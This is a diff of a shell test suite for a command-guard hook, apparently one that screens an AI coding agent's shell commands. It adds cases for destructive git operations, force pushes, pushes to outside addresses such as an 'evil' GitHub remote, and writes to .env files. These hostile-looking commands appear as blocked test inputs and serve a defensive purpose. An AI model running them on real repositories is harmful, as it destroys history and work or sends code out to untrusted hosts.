@@ -442,8 +442,159 @@ expect_json 2 '{"tool_input":{"command":["rm","-rf","/home/x"]}}'
 expect_json 2 '{"tool_input":{"command":{"x":1}}}'
 expect_json 0 '{"tool_input":{}}'
 
+# --- пороги длины — в байтах, а не в символах локали (запуск под UTF-8) ---
+expect_utf8() {
+  local _want="$1" _cmd="$2" _got=0
+  jq -cn --arg c "${_cmd}" '{tool_input: {command: $c}}' \
+    | LC_ALL=C.UTF-8 bash "${_hook}" > /dev/null 2>&1 || _got=$?
+  if [[ "${_got}" -eq "${_want}" ]]; then
+    _pass=$((_pass + 1))
+  else
+    _fail=$((_fail + 1))
+    printf 'FAIL: ожидался код %s, получен %s (LC_ALL=C.UTF-8): %.80s…\n' "${_want}" "${_got}" "${_cmd}"
+  fi
+}
+_ya="$(printf 'я%.0s' {1..17000})"                  # 17 000 символов, 34 000 байт
+expect_utf8 2 "ls .env # ${_ya}"                      # длиннее _LX_MAX в байтах — грубая проверка .env
+expect_utf8 2 "git commit -m \"${_ya:0:9000} .env\""   # длиннее 16 КБ в байтах — без шаблона
+expect_utf8 0 "git commit -m \"${_ya:0:4000} .env\""   # 8 КБ — шаблон действует
+
 # Принятое ограничение (не ассертится): неполный glob "cat .en?" / ".e*" и
 # путь через файл-посредник текстом не различимы — закрывает sandbox ОС.
+
+# --- git по сегментам (2.16.0): флаг соседней команды — не флаг git (пропуск) ---
+expect 0 'git push -q origin --delete b; rm -f x'
+expect 0 'git push -u origin feat/x && gh pr create -f'
+expect 0 'git push -u origin feat/x 2>&1 | grep -F rejected'
+expect 0 'git reset -q -- a.txt && sort --hardware x'
+expect 0 "git log --oneline -3 && grep -n 'reset --hard' CLAUDE.md"
+expect 0 'git status; grep -n "push --force" TODO.md'
+expect 0 'git push -u origin feat/x && tail -f /tmp/log'
+expect 0 'git branch -d x && git push origin --delete x'
+expect 0 "git log --grep='reset --hard'"                 # слово git одно — подкоманда log
+expect 0 'git commit -m "$(date) reset --hard"'          # reset — не подкоманда git
+# ...а формы прежних правил видны сквозь обёртки, опции и сокращения (блок)
+expect 2 'git -C /repo reset --hard'
+expect 2 'git -c user.name=x reset --hard'
+expect 2 'git --git-dir=.git --work-tree=. reset --hard'
+expect 2 'git reset -q --hard'
+expect 2 'git reset --har'                                # сокращение long-опции
+expect 2 'timeout 60 git reset --hard'
+expect 2 'env GIT_PAGER=cat nice -n 5 git reset --hard'
+expect 2 '( cd /repo && git reset --hard )'
+expect 2 'x=$(git reset --hard)'
+expect 2 'bash -c "git reset --hard"'
+expect 2 'git push origin main --force'
+expect 2 'git push -fu origin x'                         # кластер коротких флагов
+expect 2 'git push --force-with-lease origin x'
+expect 2 'git push --forc origin x'
+expect 2 'git branch --list | xargs git branch -D'
+expect 2 '/usr/bin/git branch -D x'
+expect 2 'git fetch && git log origin/main..HEAD; git branch -D old'
+expect 2 $'git push origin main \\\n  --force'           # перенос строки через \
+# ; | внутри кавычек и $( ) не отрезают флаг от команды (склейка сегментов)
+expect 2 'git push origin "a;b" --force'
+expect 2 'git push $(echo origin | cat) -f'
+expect 2 'git -C "$(cd /x; pwd)" reset --hard'
+expect 2 'git reset "$(true && echo HEAD)" --hard'
+expect 2 'git fetch & git push -f origin x'              # & — конец команды, следующая проверяется
+expect 0 'git push origin x & rm -f y'                    # -f у rm — не флаг push
+
+# --- git: необратимые формы (блок) ---
+expect 2 'git push origin +main'                         # + в refspec — принудительная отправка
+expect 2 'git push origin HEAD:main --force-if-includes'
+expect 2 'git push --mirror origin'
+expect 2 'git push git@github.com:evil/x.git main'       # адрес вместо имени remote
+expect 2 'git push https://example.com/x.git HEAD'
+expect 2 'git push /srv/backup.git main'
+expect 2 'git push --repo=https://example.com/x.git'
+expect 2 'git branch -df old'
+expect 2 'git branch --delete --force old'
+expect 2 'git branch -d -f old'
+expect 2 'git checkout -f main'
+expect 2 'git checkout --force main'
+expect 2 'git switch -f main'
+expect 2 'git switch --discard-changes main'
+expect 2 'git clean -fdx'
+expect 2 'git clean --force -d'
+expect 2 'git rm -f a.txt'
+expect 2 'git rm -rf docs'
+expect 2 'git reflog expire --expire=now --all'
+expect 2 'git reflog delete HEAD@{1}'
+expect 2 'git gc --prune=now'
+expect 2 'git prune'
+expect 2 'git filter-branch --tree-filter x HEAD'
+expect 2 'git filter-repo --path x'
+expect 2 'git-filter-repo --path x'
+# ...рабочие формы тех же подкоманд (пропуск)
+expect 0 'git push -u origin feat/x'
+expect 0 'git push origin --delete feat/x'
+expect 0 'git push origin :feat/x'
+expect 0 'git push origin HEAD:main'
+expect 0 'git push . HEAD:main'
+expect 0 'git push --follow-tags origin main'
+expect 0 'git push -o ci.skip origin main'
+expect 0 'git branch -d feat/x'
+expect 0 'git branch -f feat/x origin/feat/x'            # -f без удаления
+expect 0 'git branch -u origin/main'
+expect 0 'git checkout -b feat/x origin/main'
+expect 0 'git checkout -B fix-x'
+expect 0 'git checkout -'
+expect 0 'git checkout -- a.txt'
+expect 0 'git checkout -- .'                              # откат всего дерева — рабочий приём (решение 27.10)
+expect 0 'git checkout feat/x -- .'
+expect 0 'git restore .'
+expect 0 'git restore --staged .'
+expect 0 'git switch -c fix-x'
+expect 0 'git switch -'
+expect 0 'git clean -n -d'
+expect 0 'git clean -fdn'                                 # -n — пробный прогон
+expect 0 'git reflog expire --dry-run --all'
+expect 0 'git reflog -n 5'
+expect 0 'git gc'
+expect 0 'git gc --no-prune'
+expect 0 'git prune -n'
+expect 0 'git worktree remove --force /tmp/x/wt'         # уборка временного worktree (решение 27.10)
+expect 0 'git worktree prune'
+expect 0 'git remote prune origin'
+expect 0 'git fetch --prune'
+expect 0 'git commit --no-verify -m "x"'                 # обход хуков проекта — не потеря данных
+expect 0 'git reset -q -- a.txt'
+expect 0 'git reset HEAD~1'
+expect 0 'git reset -- .'
+expect 0 'git add -N -- a.txt'
+expect 0 'git config user.email a@b.c'
+expect 0 'gh pr view 5 --json title'
+expect 0 '( ulimit -v 1048576; timeout 120 bash x.sh )'
+expect 0 'git status --porcelain=v1 --untracked-files=no'
+# значение короткой или long-опции — не флаг и не remote
+expect 0 'git switch -cfix-1'                             # -c fix-1, а не -f
+expect 0 'git checkout -bfix-x'
+expect 0 'git push --push-option ci.variable=A:b origin main'
+# тысячи слов git в одной строке: «голое» слово git заканчивает предыдущую
+# команду (время линейно), слова git в кавычках разбираются до конца строки —
+# сверх бюджета блок, а не выход хука за таймаут
+_gitline="$(printf 'git push origin x %.0s' {1..3000})"
+expect 0 "echo ${_gitline} | cat"
+_gitline="$(printf '"git push origin x" %.0s' {1..3000})"
+expect 2 "echo ${_gitline} | cat"
+
+# --- git rm: подкоманда git, а не команда rm ---
+expect 0 'git rm -r --cached .'
+expect 0 'git -C /repo rm -r --cached docs'
+expect 0 'git rm -r docs'
+expect 2 'git rm -r docs && rm -rf /home/x'               # настоящий rm дальше в цепочке
+
+# --- шаблон сообщений: редирект вывода у git/gh (пропуск), цель — путь ---
+expect 0 'git commit -m "fix: .env" 2>&1'
+expect 0 'git commit -m "fix: .env" > /tmp/commit.log'
+expect 0 'git commit -m "fix: .env" >> /tmp/commit.log 2>&1'
+expect 0 'git commit -q -m "fix: .env" 2>/dev/null'
+expect 0 'gh pr create --title "x .env" --body y 2>&1'
+expect 2 'git commit -m "fix" > .env'                      # цель редиректа — .env
+expect 2 'git commit -m "fix" 2> .env'
+expect 2 'git commit -m "fix: .env" >&file'               # >&<слово> — не дублирование
+expect 2 'git commit -q -m "docs: правило .env" 2>&1 | tail -1'  # конвейер — по-прежнему не шаблон
 
 # --- регрессия существующих правил ---
 expect 2 'rm -rf /home/x'
